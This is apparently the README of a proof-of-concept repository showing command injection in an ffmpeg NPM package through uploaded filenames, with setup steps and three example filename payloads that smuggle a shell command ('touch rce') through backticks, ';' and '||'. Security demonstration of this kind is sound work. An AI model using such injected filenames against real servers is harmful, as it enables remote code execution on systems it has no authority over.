# ffmpeg-poc

This repository contains a web application that demonstrates how the command injection vulnerability in ffmpeg NPM package can be exploited.

### PoC

1. Clone the repository: `git clone https://github.com/5trCp7/ffmpeg-poc`
2. Install dependenciesw: `npm install`
3. Start the web server: `npm start`
4. Open the website using a browser
5. Upload a file with malicious filename

### Example payloads
\`touch rce\`.mp4
file.mp4;touch rce;
file.mp4||touch /tmp/rce||
